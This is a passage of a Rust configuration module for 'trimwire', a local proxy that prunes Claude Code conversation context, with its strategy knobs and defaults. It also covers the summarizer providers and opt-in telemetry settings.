//! TOML config loader. Two-tier merge:
//! - Global: `$XDG_CONFIG_HOME/trimwire.toml` (falls back to `~/.config/trimwire.toml`)
//! - Per-project: `./.trimwire.toml` (overrides global; lists are replaced not appended)
//!
//! Env-var overrides (`TRIMWIRE_*`, nested via `__`) take final precedence.
//! See SPIKE.md §7.
//!
//! Every field has a serde default so a missing file (or a partial one)
//! still yields a complete `Config`. The struct `Default` has all strategies
//! **off** (so the gateway is a transparent pass-through with no config);
//! `trimwire install` writes a starter config that turns the workhorses on.

use std::path::PathBuf;

use anyhow::Result;
use figment::{
    Figment,
    providers::{Env, Format, Serialized, Toml},
};
use serde::{Deserialize, Serialize};

/// Top-level config. `#[serde(default)]` fills any missing field from the
/// type's `Default` impl, so partial TOML files are fine.
#[derive(Debug, Clone, Default, Serialize, Deserialize)]
#[serde(default)]
pub struct Config {
    /// Pruning profile: `"default"` (aggressive, all eight cache-safe strategies — the
    /// shipped default) or `"gentle"` (lightest touch: dedup + purge + conservative
    /// bloat_cap + conservative thinking_strip (keep 8); no sliding-window, stale_reads,
    /// stale_input_cap, or image-strip). Seeds the strategy knobs
    /// below; explicit keys still override it. `None` ⇒ `"default"`.
    pub profile: Option<String>,
    pub server: ServerConfig,
    pub strategies: Strategies,
    pub ledger: LedgerConfig,
    pub reprune: RepruneConfig,
    /// OPT-IN summarizer. Default engine is `model-free` (no summarizer). Never
    /// load-bearing, never seeded by a profile. See `docs/SUMMARIZER.md`.
    pub summarizer: SummarizerConfig,
    /// OPT-IN anonymous telemetry (`trimwire share stats` / `share benchmark`).
    /// Off by default: the binary ships built-in community endpoints
    /// (`api.trimwire.dev`), but nothing uploads without explicit consent —
    /// `share enable` (persisted) or a one-shot `--yes`; otherwise the command
    /// dry-runs. `[share] endpoint` / `benchmark_endpoint` override the built-ins
    /// for self-hosting. The payload is content-free and bucketed client-side;
    /// see `docs/TELEMETRY.md`.
    pub share: ShareConfig,
}

#[derive(Debug, Clone, Serialize, Deserialize, Default)]
#[serde(default)]
pub struct ShareConfig {
    /// Explicit user consent to upload telemetry. **`false` by default** — nothing
    /// is ever sent without the user setting this to `true` (via `trimwire config edit`
    /// or by hand). With `enabled = true` AND a non-empty resolved endpoint (either
    /// an explicit `endpoint` override, or the built-in `COMMUNITY_STATS_ENDPOINT`
    /// constant, which ships pointing at `api.trimwire.dev`), `trimwire share stats`
    /// uploads without needing `--yes` on every run. Without consent (`enabled =
    /// false`) the command is always a dry run: it prints the payload and explains
    /// how to opt in.
    ///
    /// Privacy invariant: this flag is meaningless unless a non-empty endpoint
    /// exists. A self-hoster who sets both the config and built-in endpoints empty
    /// always dry-runs regardless of this flag — no destination, nothing to send.
    pub enabled: bool,
    /// Collector URL for `trimwire share stats`. **Empty by default** — when empty,
    /// the built-in `COMMUNITY_STATS_ENDPOINT` constant is used instead; if THAT is
    /// also empty, `share stats` does a dry run and performs no network I/O. Set this
    /// to override the built-in endpoint (self-hosted collector or local testing).
    /// A non-empty value here always wins over the built-in constant.
    pub endpoint: String,
    /// Collector URL for `trimwire share benchmark` (the model-quality rows —
    /// a SEPARATE route/dataset from the stats `endpoint`). **Empty by default**:
    /// when empty, the built-in `COMMUNITY_BENCHMARK_ENDPOINT` constant is used;
    /// if THAT is also empty, `share benchmark` is a dry run and never uploads.
    /// The built-in const points at the live `api.trimwire.dev/ingest-benchmark`.
    pub benchmark_endpoint: String,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
#[serde(default)]
pub struct RepruneConfig {
    /// Stable-prefix re-pruning: while the conversation is append-only, reuse the
    /// previous turn's pruning decisions (keeping the pruned prefix byte-stable so
    /// Anthropic's prompt cache survives) and only re-prune from scratch once the
    /// tail has grown past `threshold` messages or history is rewritten. Cuts
    /// cache churn (and cost) on long/churn-heavy sessions, at the cost of
    /// trimming the most-recent batch one checkpoint later. **Off by default** —
    /// the win isn't universal (short / already-cache-stable sessions can cost
    /// more) — but both shipped profiles (`default` and `gentle`) turn it on,
    /// because it makes their pruning cache-stable; explicit config still wins.
    pub enabled: bool,
    /// Re-prune cadence: messages added since the last checkpoint before a full
    /// re-prune (~2× `keep_recent_turns`).
    pub threshold: usize,
    /// Byte-based re-checkpoint trigger (0 = OFF). Even while the conversation is
    /// append-only and within `threshold` MESSAGES, force a re-checkpoint once the
    /// newly-appended tail carries more than this many bytes of `tool_result`
    /// content — so the deterministic strategies (incl. the age-gated bloat_cap)
    /// run on the grown history promptly instead of the stable branch freezing big
    /// new results behind a replay of stale decisions. Fixes the live short-but-
    /// large session that compressed ~0% (CANARY-01: an empty first checkpoint that
    /// never re-checkpointed because `grew` stayed ≤ `threshold`). Bounded so
    /// ordinary small-result growth keeps batching (no extra cache busts); only a
    /// genuine volume of large new tool output trips it.
    pub recheckpoint_result_bytes: usize,
    /// Max per-session states kept in memory (oldest evicted past this).
    pub max_sessions: usize,
    /// Evict a session's state after this many seconds idle.
    pub ttl_secs: u64,
}

impl Default for RepruneConfig {
    fn default() -> Self {
        Self {
            enabled: false,
            threshold: 8,
            recheckpoint_result_bytes: 0, // OFF by default; the `default` profile turns it on.
            max_sessions: 1024,
            ttl_secs: 3600,
        }
    }
}

#[derive(Debug, Clone, Serialize, Deserialize)]
#[serde(default)]
pub struct LedgerConfig {
    /// When false, the gateway proxies normally but records nothing.
    pub enabled: bool,
    /// SQLite file path. A leading `~` expands to `$HOME`.
    pub db_path: String,
    /// Rows older than this many days are pruned at daemon startup.
    pub retain_days: u32,
}

impl Default for LedgerConfig {
    fn default() -> Self {
        Self {
            enabled: true,
            db_path: "~/.trimwire/ledger.db".to_owned(),
            retain_days: 365,
        }
    }
}

#[derive(Debug, Clone, Serialize, Deserialize)]
#[serde(default)]
pub struct ServerConfig {
    pub listen: String,
    pub upstream: String,
}

#[derive(Debug, Clone, Serialize, Deserialize, Default)]
#[serde(default)]
pub struct Strategies {
    pub cross_turn_dedup: CrossTurnDedupConfig,
    pub failed_input_purge: FailedInputPurgeConfig,
    /// ON in `default`, off in `gentle`. See `stale_input_cap` strategy.
    pub stale_input_cap: StaleInputCapConfig,
    pub bloat_cap: BloatCapConfig,
    pub sliding_window: SlidingWindowConfig,
    pub image_strip: ImageStripConfig,
    pub thinking_strip: ThinkingStripConfig,
    /// ON in `default`, off in `gentle`. See `stale_reads` strategy.
    pub stale_reads: StaleReadsConfig,
    /// OPT-IN, off by default. See `simhash_dedup` strategy.
    pub simhash_dedup: SimHashDedupConfig,
    /// POC, OPT-IN off by default. See `system_shape_normalize`.
    pub system_shape_normalize: SystemShapeNormalizeConfig,
}

#[derive(Debug, Clone, Default, Serialize, Deserialize)]
#[serde(default)]
pub struct SystemShapeNormalizeConfig {
    /// POC (default false = OFF): when Claude Code emits a malformed body with a
    /// `role:"system"` entry as `messages[0]` (seen after `/compact`, `/clear`,
    /// or a model switch), Anthropic rejects it with a hard 400. When enabled,
    /// trimwire lifts that entry's content into the top-level `system` field (only
    /// if `system` is absent/empty) and drops the stray message — turning a
    /// guaranteed 400 into a valid request. Fires ONLY on that malformed shape;
    /// a well-formed body is never touched.
    pub enabled: bool,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
#[serde(default)]
pub struct CrossTurnDedupConfig {
    pub enabled: bool,
    /// Tool-name patterns never deduped (supports `*`). Defaults to the subagent
    /// tools (`Task`/`Agent`) so their results (findings / blocker lists) are never
    /// deduped — matching the profiles and the sibling strategies. Superseding a
    /// stale duplicate result is otherwise safe for any tool.
    pub exempt_tools: Vec<String>,
    /// Replacement for an earlier identical `tool_result.content`.
    pub stub: String,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
#[serde(default)]
pub struct FailedInputPurgeConfig {
    pub enabled: bool,
    /// Only purge errored-call inputs older than this many assistant turns.
    pub keep_recent_turns: usize,
    /// Tool-name patterns never purged (supports `*`).
    pub exempt_tools: Vec<String>,
}

/// Config for `StaleInputCap` — shape-preserving reduction of OLD **successful**
/// tool call inputs. Mirrors `FailedInputPurgeConfig`; only the firing condition
/// differs (success instead of error). ON in the `default` profile
/// (`keep_recent_turns = 2`), off in `gentle`. Override in `~/.config/trimwire.toml`.
#[derive(Debug, Clone, Serialize, Deserialize)]
#[serde(default)]
pub struct StaleInputCapConfig {
    /// When false this strategy is a no-op (default).
    pub enabled: bool,
    /// Only reduce successful-call inputs older than this many assistant turns.
    pub keep_recent_turns: usize,
    /// Tool-name patterns never reduced (supports `*`). Defaults to `["Task"]`
    /// because Task inputs carry sub-agent prompts the model still needs.
    pub exempt_tools: Vec<String>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
#[serde(default)]
pub struct BloatCapConfig {
    pub enabled: bool,
    /// Only trim string `tool_result` content longer than this many bytes.
    pub threshold_bytes: usize,
    /// Bytes of head/tail kept when trimming (the middle is replaced).
    pub head_bytes: usize,
    pub tail_bytes: usize,
    /// Only trim results older than this many assistant turns (safe: the
    /// model is never deprived of a result it's actively using).
    pub keep_recent_turns: usize,
    /// Tool-name patterns never trimmed at ANY age (supports `*`). For the
    /// file-AUTHORING tools (Write/Edit/MultiEdit) + Task, whose results are
    /// genuinely load-bearing — eliding them corrupts real sessions (§13A).
    pub exempt_tools: Vec<String>,
    /// Tool-name patterns exempt ONLY while RECENT (within `keep_recent_turns`);
    /// once OLD, their oversized results ARE trimmed to head+tail+signal. `Read`
    /// lives here: a just-read file may be in active use (so recent reads stay
    /// fully protected), but a large OLD Read `tool_result` is the single biggest
    /// untrimmed mass in read-heavy sessions — neither bloat_cap (it was exempt at
    /// every age) nor the summarizer (it skips tool-output-heavy slices) touched
    /// it, so live read-heavy sessions compressed ~0% (the "Read coverage gap").
    /// Age-gating it closes that gap; the model re-reads on demand if it still
    /// needs the old content. Empty = the legacy behaviour (recent-only exemption
    /// off). Supports `*`.
    pub exempt_recent_only_tools: Vec<String>,
    /// POC (opt-in, default 0 = OFF): also cap a RECENT `tool_result` — one that
    /// `keep_recent_turns` would normally exempt — if it ALONE exceeds this many
    /// bytes. Justified only at a *catastrophic* threshold where the result can't
    /// be used in full anyway (it exceeds the model's context window, so it would
    /// otherwise brick the session, e.g. a 580 KB `getDiagnostics` dump). Trims
    /// head+tail with a generous floor and a distinct `catastrophic-cap` marker.
    /// Suggested value when enabled: 524_288 (512 KB). 0 leaves recent results
    /// fully untouched (the normal safety invariant).
    ///
    /// FOOTGUN: set this WELL ABOVE `threshold_bytes`. It is meant to fire only on
    /// window-bricking results; a small value (≤ `threshold_bytes`) would trim
    /// recent results the model is actively using — defeating the recent-window
    /// protection. Treat it as a last-resort guard, not a second `threshold_bytes`.
    pub catastrophic_bytes: usize,
    /// POC / BENCHMARK (opt-in, default 0 = OFF): the "age ladder" stub tier. A
    /// STRING-content result older than this many assistant turns is FULLY stubbed
    /// to a marker instead of trimmed to head+tail — the model keeps the marker but
    /// loses the head/tail glimpse + salvaged signal lines. Trades fidelity for
    /// ~head+tail bytes per very-old result (benchmark: ~13% extra reduction on a
    /// result-heavy session). 0 = off (very-old results keep their head+tail, the
    /// current design). MUST be > `keep_recent_turns` to take effect — a value at
    /// or below it is treated as OFF (it would collapse the head+tail middle tier).
    /// Recommended ≥ ~10 so only genuinely stale results are stubbed. SCOPE: applies
    /// to string-content results only; array/structured results still take the
    /// head+tail salvage path (full-stub parity for arrays is a follow-up).
    pub stub_age_turns: usize,
    /// POC (opt-in, default empty = OFF): glob patterns for FILE PATHS whose
    /// `tool_result` `bloat_cap` never trims — even when old/oversized. Matched
    /// against the paired `tool_use`'s `input.file_path`/`input.path`. Patterns use
    /// single-`*` globbing (a `*` spans `/`), so `*AGENTS.md` matches any path
    /// ending in AGENTS.md and `*/plan.md` matches a `plan.md` under any dir; `**`
    /// is NOT special (a bare `*` already crosses `/`). Empty = nothing protected.
    ///
    /// SCOPE: to fully pin a file across pruning, also set the same globs in
    /// `[strategies.stale_reads] protected_file_patterns` — that strategy honours
    /// its own list (superseded-elision + demand-paging). A protected result is
    /// also exempt from `catastrophic_bytes`, so do not pin a file you expect to be
    /// window-bricking large. (bloat_cap covers string results; see the B-5 note
    /// for array-content scope.)
    pub protected_file_patterns: Vec<String>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
#[serde(default)]
pub struct SlidingWindowConfig {
    pub enabled: bool,
    /// Keep the most-recent N assistant turns untouched; stub denylisted
    /// tool pairs older than that.
    pub keep_recent_turns: usize,
    /// Tool-name patterns whose `tool_use`/`tool_result` pairs are stubbed
    /// once old. Supports `*` wildcards (e.g. `mcp__playwright__*`).
    pub denylist_tools: Vec<String>,
    /// Tool-name patterns never touched by this strategy, even if they also
    /// match the denylist. Defaults to the file-editing/Task tools.
    pub exempt_tools: Vec<String>,
    /// Replacement text for an elided `tool_result.content`.
    pub stub: String,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
#[serde(default)]
pub struct ImageStripConfig {
    pub enabled: bool,
    /// Tool-name patterns whose image `tool_result`s are candidates for
    /// stripping. Supports `*` wildcards.
    pub applies_to_tools: Vec<String>,
    /// Keep the K most-recent matching images intact; strip older ones.
    pub keep_recent_count: usize,
    /// Replacement text for a stripped image payload.
    pub stub: String,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
#[serde(default)]
pub struct ThinkingStripConfig {
    /// Remove `thinking` / `redacted_thinking` blocks from assistant turns older
    /// than `keep_recent_turns`. On reasoning-heavy sessions accumulated OLD thinking
    /// is ~8-16% of the wire body (~0 on light ones; the once-cited "22%" was an
    /// atypically heavy transcript — see AGENTS.md) — a large model-free reduction.
    /// **ON in BOTH shipped profiles** (`default` keep_recent=4; `gentle` keep_recent=8,
    /// 2026-06-05 — it was the only lever that gave gentle real savings on real
    /// sessions). Live API-safety is confirmed (Anthropic's signed/interleaved-thinking
    /// rules; in-progress turn always kept) and reprune REPLAYS these removals by
    /// signature, so it's cache-stable (one bust per checkpoint, not per turn). Drops
    /// only OLD reasoning — never tool_results / inputs / facts. The struct default is
    /// still `false` (a bare config with no profile is a no-op). See
    /// `src/strategies/thinking_strip.rs`.
    pub enabled: bool,
    /// Keep thinking in the most-recent N assistant turns verbatim (minimum 1 —
    /// the in-progress tool-use turn's thinking must always be preserved).
    pub keep_recent_turns: usize,
}

impl Default for ServerConfig {
    fn default() -> Self {
        Self {
            listen: "127.0.0.1:8765".to_owned(),
            upstream: "https://api.anthropic.com".to_owned(),
        }
    }
}

impl Default for CrossTurnDedupConfig {
    fn default() -> Self {
        Self {
            enabled: false,
            // Exempt the subagent tools by default, matching the profiles and the
            // sibling strategies (bloat_cap/stale_input_cap/sliding_window carry the
            // same default). `Task`+`Agent` are both subagent-launch names (the name
            // drifted across CC versions); never dedup a subagent result (findings /
            // blocker lists), so a direct struct-default caller doesn't lose that
            // protection. No shipped-behavior change: the live path applies a profile
            // (which already sets this) and the strategy is off in the bare default.
            exempt_tools: vec!["Task".to_owned(), "Agent".to_owned()],
            stub: "[trimwire: superseded by a later identical call]".to_owned(),
        }
    }
}

impl Default for FailedInputPurgeConfig {
    fn default() -> Self {
        Self {
            enabled: false,
            keep_recent_turns: 4,
            // SUBAGENT tools exempt: never elide a FAILED subagent call's input (the
            // sub-task prompt) — the model needs to see what the sub-task was, and a
            // retry may re-emit it (loop-safety). `Task` and `Agent` are both
            // subagent-launch names (the name drifted across CC versions). Authoring
            // tools (Write/Edit/MultiEdit/NotebookEdit) are already a hard floor in
            // apply_counted, so only the subagent names are listed here.
            exempt_tools: ["Task", "Agent"].iter().map(|s| (*s).to_owned()).collect(),
        }
    }
}

impl Default for StaleInputCapConfig {
    fn default() -> Self {
        Self {
            enabled: false,
            keep_recent_turns: 4,
            // Exempt the file-AUTHORING tools (Write/Edit/MultiEdit) and Task —
            // mirrors bloat_cap/sliding_window ("load-bearing"). CRITICAL: eliding a
            // Write/Edit `new_string` corrupts real sessions — the model rebuilds on
            // content it can no longer see and reproduces the elision MARKER as the
            // file body (observed live: a Go file written as "[trimwire: NB input
            // elided]", breaking the build). Task carries sub-agent prompts. We only
            // elide bulk from NON-authoring inputs (Bash stdin/heredocs, MCP args).
            // NotebookEdit authors cell source (`new_source`) — same class. These four
            // authoring tools are ALSO an unconditional hard floor (strategies::
            // AUTHORING_TOOLS); listing them here keeps the visible config honest.
            // `Task`+`Agent` = subagent tools (name drifted across CC versions); both listed.
            exempt_tools: [
                "Task",
                "Agent",
                "Write",
                "Edit",
                "MultiEdit",
                "NotebookEdit",
            ]
            .iter()
            .map(|s| (*s).to_owned())
            .collect(),
        }
    }
}

impl Default for BloatCapConfig {
    fn default() -> Self {
        Self {
            enabled: false,
            threshold_bytes: 16_384,
            head_bytes: 2_048,
            tail_bytes: 2_048,
            keep_recent_turns: 4,
            // File-AUTHORING + SUBAGENT results are load-bearing — never trim them at
            // any age (eliding them corrupts real sessions, §13A). `Task` AND `Agent`
            // are both subagent-launch tool names (the name drifted Task→Agent across
            // Claude Code versions); list both so subagent findings (blocker lists,
            // per-file analysis) aren't middle-trimmed. `Read` is NOT here: it's
            // age-gated below (exempt while recent, trimmed once old) so large OLD file
            // reads — the dominant untrimmed mass in read-heavy sessions — finally get
            // capped (the "Read coverage gap" the live canaries exposed).
            exempt_tools: ["Edit", "Write", "MultiEdit", "Task", "Agent"]
                .iter()
                .map(|s| (*s).to_owned())
                .collect(),
            // Read: exempt while RECENT (a just-read file may be in active use),
            // trimmed to head+tail once OLD (the model re-reads on demand).
            exempt_recent_only_tools: vec!["Read".to_owned()],
            catastrophic_bytes: 0, // POC: OFF by default (recent results untouched)
            stub_age_turns: 0,     // POC: OFF by default (very-old keep head+tail)
            protected_file_patterns: Vec::new(), // POC: OFF by default (no path protected)
        }
    }
}

impl Default for SlidingWindowConfig {
    fn default() -> Self {
        Self {
            enabled: false,
            keep_recent_turns: 4,
            denylist_tools: Vec::new(),
            // SPIKE.md §4: these are "never mutate" across all strategies.
            // `Task`+`Agent` = subagent tools (name drifted across CC versions); both listed.
            // `NotebookEdit` authors cell source (`new_source`) — same §13A corruption
            // class as Write/Edit, so it must be exempt here too (sliding_window stubs
            // the input to `{}`, which would wipe an authored cell body if denylisted).
            exempt_tools: [
                "Read",
                "Edit",
                "Write",
                "MultiEdit",
                "NotebookEdit",
                "Task",
                "Agent",
            ]
            .iter()
            .map(|s| (*s).to_owned())
            .collect(),
            stub: "[trimwire: elided, older than sliding window]".to_owned(),
        }
    }
}

impl Default for ImageStripConfig {
    fn default() -> Self {
        Self {
            enabled: false,
            // `*screenshot*` covers screenshot tools; `*snapshot*` covers
            // accessibility/DOM/heap snapshots (`browser_snapshot`,
            // `take_snapshot`, `take_heapsnapshot`) that also return large image/
            // base64 blobs but don't contain "screenshot" — they were persisting
            // unbounded and re-billing every turn. is_base64_image_content already
            // detects the payloads; only the name gate was too narrow.
            applies_to_tools: vec!["*screenshot*".to_owned(), "*snapshot*".to_owned()],
            keep_recent_count: 3,
            stub: "[trimwire: image stripped]".to_owned(),
        }
    }
}

impl Default for ThinkingStripConfig {
    fn default() -> Self {
        Self {
            enabled: false,
            // Keep the last 4 assistant turns' thinking (sliding window). 4 is a
            // verified-safe "mid" aggression: the in-progress turn is always kept,
            // API-safety is independent of this value (live-confirmed), and 4 turns
            // of recent reasoning is ample continuity. Bump to 5–6 for more margin.
            keep_recent_turns: 4,
        }
    }
}

/// Config for `StaleReads` — elide superseded file-Read results.
///
/// A `tool_result` for a file Read at turn T is stale if, at any later turn,
/// the same path is accessed by Read/Write/Edit/MultiEdit. The most-recent
/// operation on each path is always preserved.
///
/// ON in the `default` profile, off in `gentle`. Override in
/// `~/.config/trimwire.toml`.
#[derive(Debug, Clone, Serialize, Deserialize)]
#[serde(default)]
pub struct StaleReadsConfig {
    /// When false this strategy is a no-op (default).
    pub enabled: bool,
    /// Tool-name patterns never tracked as file operations (supports `*`).
    /// Defaults to empty (all path-bearing tools tracked).
    pub exempt_tools: Vec<String>,
    /// Replacement text for an elided stale Read `tool_result.content`.
    pub stub: String,
    /// Demand-paging (opt-in extra): page out the LAST (current-view) Read of a
    /// path when it is older than `keep_recent_turns` AND its content exceeds this
    /// many bytes, replacing it with a "re-read to restore" marker (the model
    /// self-heals by re-reading; CC returns fresh content). 0 = OFF (only the
    /// safe superseded-elision runs). Addressable (Read) content only.
    pub page_min_bytes: usize,
    /// Keep the most-recent N assistant turns' Reads untouched. Gates BOTH
    /// behaviors: a superseded Read is elided only once it ages past this window
    /// (issue #113 — a read the model re-reads/edits a turn or two later is still
    /// in the active working set; eliding it would force a needless re-read), and
    /// demand-paging only pages reads older than this. Min 1.
    pub keep_recent_turns: usize,
    /// POC (opt-in, default empty = OFF): glob patterns for FILE PATHS this strategy
    /// never touches — neither superseded-elision nor demand-paging will elide/page a
    /// Read whose path matches. Mirrors `bloat_cap.protected_file_patterns` (set the
    /// same globs in both to fully pin a file across all pruning). Single-`*`
    /// globbing (a `*` spans `/`); empty = nothing protected.
    pub protected_file_patterns: Vec<String>,
}

impl Default for StaleReadsConfig {
    fn default() -> Self {
        Self {
            enabled: false,
            exempt_tools: Vec::new(),
            // Kept CONCISE on purpose: the marker length is the floor below which a
            // superseded read won't be trimmed (shrink guard), so a verbose stub would
            // stop trimwire eliding small reads. The supersession case is low-risk (a
            // newer view of the file is present later), so it does not need the
            // actionable "tell the user / trimwire report" text the demand-page marker
            // carries — agent awareness lives in the /trimwire skill + FOR-AGENTS.md.
            stub: "[trimwire: stale read — superseded by a newer view of this file later in the conversation]".to_owned(),
            page_min_bytes: 0,
            keep_recent_turns: 4,
            protected_file_patterns: Vec::new(), // POC: OFF by default
        }
    }
}

/// Config for `SimHashDedup` — collapse near-duplicate `tool_result` content
/// using 64-bit SimHash.
///
/// Catches near-duplicates that `cross_turn_dedup` misses: e.g. two `cargo
/// build` / `cargo test` outputs differing only in timestamps, PIDs, or
/// durations. The older result is collapsed to a size-breadcrumb marker;
/// the newest verbatim copy is kept.
///
/// **OPT-IN — off by default.** Not included in any profile; enable explicitly:
///
/// ```toml
/// [strategies.simhash_dedup]
/// enabled = true
/// ```
#[derive(Debug, Clone, Serialize, Deserialize)]
#[serde(default)]
pub struct SimHashDedupConfig {
    /// When false this strategy is a no-op (default).
    pub enabled: bool,
    /// Only consider tool_results older than this many assistant turns.
    pub keep_recent_turns: usize,
    /// Maximum Hamming distance (popcount of XOR) for two hashes to be
    /// considered near-duplicates. Default 3 out of 64 bits (~95% similar).
    pub hamming_threshold: u32,
    /// Minimum serialized byte length of a result to be a candidate. Tiny
    /// results are not worth hashing and are prone to false-positives. Default 512.
    pub min_bytes: usize,
    /// Tool-name patterns never considered for near-dedup (supports `*`).
    pub exempt_tools: Vec<String>,
    /// Replacement prefix for an elided near-duplicate `tool_result.content`.
    pub stub: String,
}

impl Default for SimHashDedupConfig {
    fn default() -> Self {
        Self {
            enabled: false,
            keep_recent_turns: 4,
            hamming_threshold: 3,
            min_bytes: 512,
            exempt_tools: Vec::new(),
            stub: "[trimwire: near-duplicate of a later result]".to_owned(),
        }
    }
}

/// Connection knobs for a named cloud API provider (`[[summarizer.providers]]`).
///
/// Each entry in the `providers` array corresponds to one TOML
/// `[[summarizer.providers]]` table.  The `id` is a short user-chosen name
/// (e.g. `"anthropic"`, `"openrouter"`) that can be referenced in the `engine`
/// and `fallback` fields.
///
/// ```toml
/// [[summarizer.providers]]
/// id          = "anthropic"
/// style       = "anthropic"
/// base_url    = "https://api.anthropic.com"
/// model       = "claude-haiku-4-5"
/// api_key_env = "ANTHROPIC_API_KEY"
/// timeout_secs = 30
/// ```
///
/// The key may come from either `api_key_env` (an env-var name) or `api_key_file`
/// (a path read at runtime). The file fallback exists for daemonized installs
/// (systemd/launchd) where the service does not inherit interactive-shell exports.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
#[serde(default)]
pub struct SummarizerProviderConfig {
    /// Short user-chosen identifier (no spaces). Referenced by `engine`/`fallback`.
    pub id: String,
    /// API wire style: `"anthropic"` or `"openai"` (OpenAI-compatible). Controls the
    /// auth header (`x-api-key` vs `Bearer`) and the request/response JSON shape —
    /// independent of `full_url`.
    pub style: String,
    /// Base URL; the style's path (`/v1/messages` or `/v1/chat/completions`) is
    /// appended. Empty is allowed only if `full_url` is set.
    pub base_url: String,
    /// EXACT POST URL override (advanced). When set, it is used verbatim and the
    /// `base_url` + `/v1/...` convention is bypassed — for providers whose path isn't
    /// the standard one (e.g. Z.ai's OpenAI endpoint `…/paas/v4/chat/completions`, or
    /// Azure OpenAI deployment URLs). `style` still selects the auth header + payload.
    pub full_url: Option<String>,
    /// Model name / deployment ID to request.
    pub model: String,
    /// Name of the environment variable that holds the API key (never the key itself).
    pub api_key_env: String,
    /// Path to a file whose contents are the API key (whitespace-trimmed). A leading
    /// `~/` expands to `$HOME`. trimwire stores the PATH, never the key. Used when
    /// `api_key_env` is unset, OR as a fallback when the named env var is absent —
    /// so a background service (systemd/launchd) with no inherited shell env can
    /// still authenticate. `chmod 600` the file.
    pub api_key_file: Option<String>,
    /// Hard timeout for the API call in seconds.
    pub timeout_secs: u64,
}

impl Default for SummarizerProviderConfig {
    fn default() -> Self {
        Self {
            id: String::new(),
            style: "anthropic".to_owned(),
            base_url: String::new(),
            full_url: None,
            model: String::new(),
            api_key_env: String::new(),
            api_key_file: None,
            timeout_secs: 180,
        }
    }
}

/// Connection knobs for the local ollama / llama.cpp backend.
/// See also [`SummarizerProviderConfig`] for cloud API providers.
#[derive(Debug, Clone, Serialize, Deserialize)]
#[serde(default)]
pub struct SummarizerLocalConfig {
    /// Base URL of the local model server (ollama's `/api/chat` is appended).
    pub endpoint: String,
    /// Locally-pulled model tag to summarize with.
    pub model: String,
    /// `keep_alive` passed to ollama (seconds). 0 unloads the model from RAM
    /// immediately after the batch — RAM-optimal for a contested machine.
    pub keep_alive_secs: u64,
    /// Max ollama `num_ctx` to request — also sets the local slice budget
    /// (`≈ max_num_ctx × 2.5 − 2000` chars). Default 25600 (≈60 KB slice; the KV cache
    /// only grows when a slice is actually that big). NOTE: qwen3.5:4b's reliable ceiling
    /// is ~60 KB — at 40000 (≈96 KB) it FAILS (N=10 = 0/10), so don't raise it for that
    /// model; a stronger local model might hold more (validate with `summarizer probe
    /// --runs`). Keep it modest on a CPU-only box (a big prompt is slow). Clamped to a
    /// hard ceiling to prevent a KV-cache OOM from a stray huge value.
    pub max_num_ctx: u64,
}

impl Default for SummarizerLocalConfig {
    fn default() -> Self {
        Self {
            endpoint: "http://localhost:11434".to_owned(),
            // qwen3.5:4b is the only tag that passed BOTH the cost (P0a) and harm
            // (P0b) gates; qwen3.5:2b is a harm-failing opt-down.
            model: "qwen3.5:4b".to_owned(),
            keep_alive_secs: 0,
            max_num_ctx: 25_600, // ≈60 KB local slice (was an implicit 16384/≈38 KB)
        }
    }
}

/// OPT-IN summarizer configuration. The engine switch replaces the old `enabled`
/// bool: `engine = "model-free"` (the default) is equivalent to the old
/// `enabled = false`.
///
/// Best-effort and never load-bearing: any failure falls back to model-free
/// pruning. Not part of any profile and non-deterministic, so excluded from the
/// Rust<->Python parity oracle.
///
/// ```toml
/// [summarizer]
/// engine            = "local"
/// trigger_bytes     = 204800
/// timeout_secs      = 180
/// keep_recent_turns = 6
///
/// [summarizer.local]
/// endpoint = "http://localhost:11434"
/// model    = "qwen3.5:4b"
///
/// [[summarizer.providers]]
/// id          = "anthropic"
/// style       = "anthropic"
/// base_url    = "https://api.anthropic.com"
/// model       = "claude-haiku-4-5"
/// api_key_env = "ANTHROPIC_API_KEY"
/// ```
#[derive(Debug, Clone, Serialize, Deserialize)]
#[serde(default)]
pub struct SummarizerConfig {
    /// Which backend to use. `"model-free"` (the default) disables the
    /// summarizer. `"local"` uses a local ollama server. Any other string is
    /// treated as a provider `id` (must match an entry in `providers`).
    ///
    /// Valid values: `"model-free"`, `"local"`, or a provider `id`.
    pub engine: String,
    /// Fallback chain tried in order when the primary engine is unavailable.
    /// `"model-free"` is the IMPLICIT terminal and never needs to be listed.
    /// Each entry is `"model-free"`, `"local"`, or a provider `id`.
    pub fallback: Vec<String>,
    // ---- backend-agnostic cadence knobs ----
    /// Summarizer pace preset — `"default"` (the validated baseline cadence) or
    /// `"gentle"` (summarize LESS often: engage later + a bigger re-summarize delta +
    /// protect more recent turns). Seeds the cadence knobs below at load time; any
    /// explicit knob still overrides the preset. Unknown -> "default".
    pub mode: String,
    /// Only engage once the serialized `messages[]` exceeds this many bytes —
    /// short/early sessions never call the model.
    pub trigger_bytes: usize,
    /// Hard timeout for the summarizer call; on elapse, skip compaction this batch.
    pub timeout_secs: u64,
    /// Protect this many recent assistant turns from summarization (active
    /// working set kept verbatim). Min 1.
    pub keep_recent_turns: usize,
    /// ADAPTIVE re-summarization gate: re-summarize only once the UN-summarized
    /// prunable delta (serialized bytes since the cached summary) reaches this size.
    pub resummarize_after_bytes: usize,
    /// Accumulator mode — when true, re-summarization APPENDS a frozen DELTA
    /// segment instead of REPLACING the whole summary. Default true (validated).
    pub accumulator: bool,
    /// Hard cap on the accumulator's frozen-segment chain.
    pub max_summary_segments: usize,
    /// Max serialized bytes of the OLD slice fed to the summarizer per segment.
    /// `None` (default) selects a per-engine budget: the LOCAL engine uses a
    /// num_ctx-safe cap (~60 KB from the default `max_num_ctx=25600`; ollama's KV
    /// cache is sized for `num_ctx`, so a bigger slice risks OOM / silent
    /// prompt-head truncation); an API-ONLY chain
    /// uses a much larger cap (cloud models have 100K+ context) so the summary can
    /// cover far more old content per pass. Set an explicit value to override both.
    /// Capped at the local size whenever the LOCAL engine is anywhere in the chain
    /// (the slice must fit whichever engine actually runs).
    pub slice_char_budget: Option<usize>,
    /// Fidelity-priority gate (§15). 1.0 (default) = strict: a summary is kept only
    /// if it is SMALLER than lossy model-free pruning on the same region. Above 1.0
